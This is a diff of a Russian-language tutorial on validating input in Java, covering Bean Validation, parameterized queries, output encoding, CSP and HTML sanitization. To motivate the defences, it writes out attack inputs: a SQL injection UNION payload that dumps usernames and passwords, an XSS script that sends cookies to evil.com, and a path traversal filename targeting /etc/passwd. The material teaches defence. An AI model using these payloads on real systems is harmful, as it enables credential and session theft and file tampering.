@@ -1,187 +1,320 @@
 # Валидация входных данных в Java
 
-## Что такое валидация?
+## Часть 1: Зачем нужна валидация?
 
-Представь вход в театр. На входе стоит билетёр. Он проверяет: есть ли у тебя билет? На правильный ли спектакль? На правильное ли место? Не просрочен ли билет? Если всё ок — пропускает. Если нет — не пускает.
+Представь, что ты ведёшь приём в больнице. Каждый пациент заполняет анкету. Что будет, если не проверять, что написано?
+- В поле «возраст» написано «abc» — система сломается
+- В поле «адрес» написано 10000 символов — память переполнится
+- В поле «фамилия» вставлен SQL-код — база данных удалится
+- В поле «комментарий» вставлен JavaScript — другие пациенты увидят всплывающее окно
 
-**Валидация входных данных** — это именно такой "билетёр" для приложения. Каждый запрос, каждый параметр, каждый файл — проверяется. Корректные данные? Проходят. Некорректные — отбрасываются.
+**Валидация входных данных** — это проверка: данные соответствуют ожиданиям? Корректны? Безопасны?
 
-Без валидации любой может отправить что угодно. SQL-инъекцию. XSS. Переполнение буфера. Валидация — первая линия обороны.
+Без валидации приложение принимает что угодно. Это приводит к:
+- **SQL Injection** — внедрение SQL-кода
+- **XSS** — внедрение JavaScript
+- **Path Traversal** — доступ к файлам системы
+- **Buffer Overflow** — переполнение буфера
+- **DoS** — отказ в обслуживании через перегрузку
 
-## Зачем нужна валидация?
+## Ситуации из реальной жизни
 
-### Ситуация 1: SQL Injection
+### Ситуация 1: SQL Injection через поиск
 
-Пользователь ввёл в поле: "'; DROP TABLE users; --"
-Без валидации — база данных удалена.
+Пользователь вводит в поисковую строку:
 
-### Ситуация 2: XSS
+    ' UNION SELECT username, password FROM users--
 
-Пользователь ввёл: "<script>alert('xss')</script>"
-Без валидации — скрипт выполнится в браузере других пользователей.
+Если приложение просто вставляет строку в запрос:
 
-### Ситуация 3: Path Traversal
+    String query = "SELECT * FROM products WHERE name = '" + userInput + "'";
 
-Пользователь запросил: "../../../etc/passwd"
-Без валидации — чтение системных файлов.
+Результат:
 
-## Типы валидации
+    SELECT * FROM products WHERE name = '' 
+    UNION SELECT username, password FROM users--'
 
-### Синтаксическая
+Пользователь получает все логины и пароли.
 
-| Что проверяем | Пример |
-|---------------|--------|
-| Тип | Это число? |
-| Длина | Не длиннее 100 символов |
-| Формат | Email, телефон |
-| Диапазон | Число 1-100 |
-| RegEx | Только буквы и цифры |
+### Ситуация 2: XSS через комментарий
 
-### Семантическая
+Пользователь оставляет комментарий:
 
-| Что проверяем | Пример |
-|---------------|--------|
-| Бизнес-логика | Дата рождения в прошлом |
-| Уникальность | Email не занят |
-| Существование | ID существует |
-| Права | Пользователь может это? |
+    <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
+
+Если комментарий отображается без обработки — JavaScript выполнится в браузере каждого посетителя. Cookie уйдут злоумышленнику.
+
+### Ситуация 3: Path Traversal через загрузку файла
+
+Пользователь загружает файл с именем:
+
+    ../../../etc/passwd
+
+Если приложение сохраняет файл по пути:
+
+    /uploads/ + filename
+
+Результат:
+
+    /uploads/../../../etc/passwd = /etc/passwd
+
+Файл системы перезаписан.
+
+## Часть 2: Типы валидации
+
+### Синтаксическая валидация
+
+Проверка формата данных.
+
+| Что проверяем | Пример | Как |
+|----------------|--------|-----|
+| Тип | Это число? | `Integer.parseInt()` |
+| Длина | Не длиннее 100 символов | `String.length() <= 100` |
+| Формат | Email, телефон | Regex |
+| Диапазон | Число от 1 до 100 | `value >= 1 && value <= 100` |
+| Набор символов | Только буквы и цифры | Regex `^[a-zA-Z0-9]+$` |
+| Обязательность | Поле не пустое | `!= null && !isEmpty()` |
+
+### Семантическая валидация
+
+Проверка смысла данных.
+
+| Что проверяем | Пример | Как |
+|----------------|--------|-----|
+| Бизнес-логика | Дата рождения в прошлом | `birthDate.isBefore(LocalDate.now())` |
+| Уникальность | Email не занят | Запрос в БД |
+| Существование | ID товара существует | Запрос в БД |
+| Права | Пользователь может это? | Проверка авторизации |
+| Ссылочная целостность | ID категории существует | Внешний ключ или запрос |
 
 ### Whitelist vs Blacklist
 
-| Подход | Описание | Пример |
-|--------|----------|--------|
-| Whitelist | Разрешить только известное good | Только буквы |
-| Blacklist | Запретить известное bad | Запретить <script> |
+| Подход | Описание | Пример | Безопасность |
+|--------|----------|--------|--------------|
+| **Whitelist** | Разрешить только известное хорошее | «Только буквы русского и английского алфавита» | ✅ Высокая |
+| **Blacklist** | Запретить известное плохое | «Запретить символы < > ' "» | ❌ Низкая |
 
-**Whitelist предпочтительнее.**
+**Whitelist предпочтительнее.** Невозможно знать все плохие входные данные. Но можно определить, что является хорошим.
 
-## Валидация в Java
+Пример whitelist для имени пользователя:
 
-### Bean Validation (JSR-380)
-
-```java
-public class User {
-    @NotNull
-    @Size(min=2, max=50)
-    private String name;
-    
-    @Email
-    private String email;
-    
-    @Min(18)
-    @Max(120)
-    private int age;
-}
-```
-
-### Spring Validation
-
-```java
-@PostMapping("/users")
-public ResponseEntity<User> create(
-    @Valid @RequestBody User user,
-    BindingResult result) {
-    if (result.hasErrors()) {
-        return ResponseEntity.badRequest().build();
+    // Разрешены только буквы, цифры, пробел, дефис
+    String name = request.getParameter("name");
+    if (!name.matches("^[a-zA-Zа-яА-Я0-9\\s\\-]+$")) {
+        throw new ValidationException("Invalid name format");
     }
-    return ResponseEntity.ok(service.create(user));
-}
-```
 
-### Custom Validator
+## Часть 3: Bean Validation (JSR-380)
 
-```java
-public class SafeHtmlValidator implements ConstraintValidator<SafeHtml, String> {
-    @Override
-    public boolean isValid(String value, ConstraintValidatorContext context) {
-        return value == null || !value.matches(".*<script.*>.*");
+### Аннотации валидации
+
+    import javax.validation.constraints.*;
+    
+    public class UserRegistration {
+        
+        @NotNull(message = "Name is required")
+        @Size(min = 2, max = 50, message = "Name must be 2-50 characters")
+        @Pattern(regexp = "^[a-zA-Zа-яА-Я\\s\\-]+$", message = "Invalid characters")
+        private String name;
+        
+        @NotNull(message = "Email is required")
+        @Email(message = "Invalid email format")
+        private String email;
+        
+        @Min(value = 18, message = "Must be at least 18")
+        @Max(value = 120, message = "Invalid age")
+        private int age;
+        
+        @Pattern(regexp = "^\\+?[0-9\\s\\-]{10,20}$", message = "Invalid phone")
+        private String phone;
+        
+        @AssertTrue(message = "Must accept terms")
+        private boolean termsAccepted;
     }
-}
-```
 
-## Sanitization
+### Использование в контроллере
 
-### HTML
+    @PostMapping("/register")
+    public ResponseEntity<?> register(
+            @Valid @RequestBody UserRegistration request,
+            BindingResult result) {
+        
+        if (result.hasErrors()) {
+            return ResponseEntity.badRequest()
+                .body(result.getAllErrors());
+        }
+        
+        userService.register(request);
+        return ResponseEntity.ok("Registered");
+    }
 
-| Библиотека | Описание |
-|------------|----------|
-| OWASP Java HTML Sanitizer | Удаляет опасные теги |
-| jsoup | Парсинг и очистка HTML |
+### Группы валидации
 
-### SQL
+    public interface CreateGroup {}
+    public interface UpdateGroup {}
+    
+    public class User {
+        @Null(groups = CreateGroup.class)  // При создании ID должен быть null
+        @NotNull(groups = UpdateGroup.class)  // При обновлении — обязателен
+        private Long id;
+        
+        @NotNull(groups = {CreateGroup.class, UpdateGroup.class})
+        private String name;
+    }
+    
+    // Использование
+    @PostMapping
+    public User create(@Validated(CreateGroup.class) @RequestBody User user) { }
+    
+    @PutMapping
+    public User update(@Validated(UpdateGroup.class) @RequestBody User user) { }
 
-| Метод | Описание |
-|-------|----------|
-| PreparedStatement | Параметризованные запросы |
-| JPA/Hibernate | ORM с параметрами |
-| Stored procedures | Хранимые процедуры |
+## Часть 4: Защита от SQL Injection
 
-### URL
+### Проблема
 
-| Метод | Описание |
-|-------|----------|
-| URL encoding | Кодирование символов |
-| Whitelist хостов | Только разрешённые |
-| File validation | Проверка пути |
+    // ❌ НЕПРАВИЛЬНО — конкатенация строк
+    String query = "SELECT * FROM users WHERE username = '" + username + "'";
+    Statement stmt = connection.createStatement();
+    ResultSet rs = stmt.executeQuery(query);
 
-## Encoding
+### Решение: PreparedStatement
+
+    // ✅ ПРАВИЛЬНО — параметризованный запрос
+    String query = "SELECT * FROM users WHERE username = ?";
+    PreparedStatement pstmt = connection.prepareStatement(query);
+    pstmt.setString(1, username);  // Экранирование происходит автоматически
+    ResultSet rs = pstmt.executeQuery();
+
+Почему это безопасно:
+- Параметры обрабатываются отдельно от SQL-команды
+- Спецсимволы (`'`, `"`, `;`, `--`) экранируются
+- Структура запроса не может быть изменена
+
+### Использование ORM
+
+    // JPA/Hibernate
+    @Query("SELECT u FROM User u WHERE u.username = :username")
+    User findByUsername(@Param("username") String username);
+    
+    // Spring Data JPA
+    List<User> findByUsername(String username);  // Автоматически параметризовано
+
+### Ручное экранирование (последний резорт)
+
+Если невозможно использовать PreparedStatement:
+
+    String safe = username.replace("'", "''");  // Удвоить апостроф
+
+**Но лучше использовать ORM или PreparedStatement.**
+
+## Часть 5: Защита от XSS
 
 ### Output Encoding
 
-| Контекст | Метод |
-|----------|-------|
-| HTML | HtmlUtils.htmlEscape() |
-| JavaScript | StringEscapeUtils.escapeEcmaScript() |
-| CSS | OwaspEncoder.encodeForCSS() |
-| URL | URLEncoder.encode() |
-| XML | StringEscapeUtils.escapeXml() |
+Данные, выводимые пользователю, должны быть закодированы.
+
+| Контекст | Кодирование | Пример |
+|----------|-------------|--------|
+| HTML | HTML entities | `<` → `&lt;` |
+| JavaScript | JS escaping | `"` → `\\"` |
+| CSS | CSS escaping | `<` → `\\3c ` |
+| URL | URL encoding | `space` → `%20` |
+| XML | XML entities | `<` → `&lt;` |
+
+    import org.springframework.web.util.HtmlUtils;
+    
+    // Кодирование для HTML
+    String safe = HtmlUtils.htmlEscape(userInput);
+    // <script> → &lt;script&gt; — не выполнится
+
+### Content Security Policy (CSP)
+
+Заголовок HTTP, ограничивающий источники контента:
+
+    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
+
+Это означает: «Выполнять JavaScript только с нашего сайта».
+
+## Часть 6: Sanitization
+
+### HTML Sanitization
+
+Если пользователь вводит HTML (например, в редакторе статьи), нужно удалить опасные теги:
+
+| Библиотека | Описание |
+|------------|----------|
+| OWASP Java HTML Sanitizer | Удаляет опасные теги, оставляет безопасные |
+| jsoup | Парсинг и очистка HTML |
+
+    // OWASP Java HTML Sanitizer
+    PolicyFactory policy = new HtmlPolicyBuilder()
+        .allowElements("a", "b", "i", "p", "br")
+        .allowAttributes("href").onElements("a")
+        .toFactory();
+    
+    String safeHtml = policy.sanitize(userInput);
+    // <script>alert('xss')</script> → удалено
+    // <b>жирный</b> → оставлено
+
+### URL Validation
+
+    // Проверка URL
+    URL url = new URL(userInput);
+    if (!url.getHost().endsWith("trusted-domain.com")) {
+        throw new ValidationException("Invalid URL");
+    }
+    
+    // Или whitelist протоколов
+    if (!url.getProtocol().equals("https")) {
+        throw new ValidationException("Only HTTPS allowed");
+    }
 
 ## Лучшие практики
 
 | Практика | Описание |
 |----------|----------|
-| Всегда валидировать | На сервере, не только на клиенте |
-| Whitelist | Разрешить известное хорошее |
-| Fail fast | Отклонить сразу |
+| Всегда валидировать на сервере | Клиентскую валидацию можно обойти |
+| Whitelist подход | Разрешить только известное хорошее |
+| Fail fast | Отклонить сразу, не пытаться исправить |
 | Не доверять входу | Любой вход — потенциально вредоносный |
-| Layered defense | Валидация + параметризация + encoding |
-| Log | Но не логировать пароли |
+| Layered defense | Валидация + параметризация + кодирование |
+| Не логировать чувствительные данные | Пароли, карты, токены |
+| Использовать стандартные библиотеки | OWASP, Spring Validation |
 
-## Чек-лист понимания
+### Чек-лист безопасности
 
-- [ ] Что такое валидация?
-- [ ] Какие типы валидации?
-- [ ] Чем whitelist отличается от blacklist?
-- [ ] Что такое Bean Validation?
-- [ ] Как защититься от SQL injection?
-- [ ] Что такое sanitization?
-- [ ] Какие библиотеки для HTML?
-- [ ] Что такое output encoding?
-- [ ] Какие лучшие практики?
-- [ ] Почему валидация на сервере обязательна?
+| Проверка | Статус |
+|----------|--------|
+| Все входные данные валидируются | ⬜ |
+| Используются PreparedStatement / ORM | ⬜ |
+| Output encoding при выводе | ⬜ |
+| CSP заголовок настроен | ⬜ |
+| HTML sanitized где нужно | ⬜ |
+| Файлы проверяются на тип и размер | ⬜ |
+| URL валидируются | ⬜ |
+| Ошибки не раскрывают внутреннюю информацию | ⬜ |
 
-### Ответы на чек-лист
+### Комплаенс
 
-1. **Валидация** — проверка входных данных на корректность.
+| Стандарт | Требование | Реализация |
+|----------|------------|------------|
+| OWASP Top 10 | A03: Injection | PreparedStatement, ORM |
+| PCI DSS | Защита от XSS | Output encoding, CSP |
+| GDPR | Защита данных | Валидация + шифрование |
+| ISO 27001 | Контроль входных данных | Валидация на всех уровнях |
 
-2. **Типы**: синтаксическая (тип, длина, формат), семантическая (бизнес-логика).
+## Вывод
 
-3. **Whitelist** — разрешить известное хорошее. **Blacklist** — запретить известное плохое. Whitelist лучше.
+Валидация — первая линия обороны:
+1. **Синтаксическая** — формат, тип, длина
+2. **Семантическая** — смысл, бизнес-логика
+3. **Whitelist** — разрешить только хорошее
+4. **Параметризация** — защита от SQL Injection
+5. **Кодирование** — защита от XSS
+6. **Sanitization** — очистка HTML
 
-4. **Bean Validation** — JSR-380. Аннотации: @NotNull, @Size, @Email, @Min, @Max.
-
-5. **SQL Injection**: PreparedStatement, ORM, stored procedures.
-
-6. **Sanitization** — очистка данных от опасного содержимого.
-
-7. **HTML**: OWASP Java HTML Sanitizer, jsoup.
-
-8. **Output encoding** — кодирование перед выводом в разные контексты.
-
-9. **Лучшие практики**: всегда валидировать, whitelist, fail fast, не доверять входу, layered defense.
-
-10. **Валидация на сервере обязательна**, потому что клиентскую валидацию можно обойти.
+Правило: **никогда не доверяй пользовательскому вводу. Валидируй всё.**
 
 ---
-
 _Статья создана на основе анализа материалов Habr по валидации_
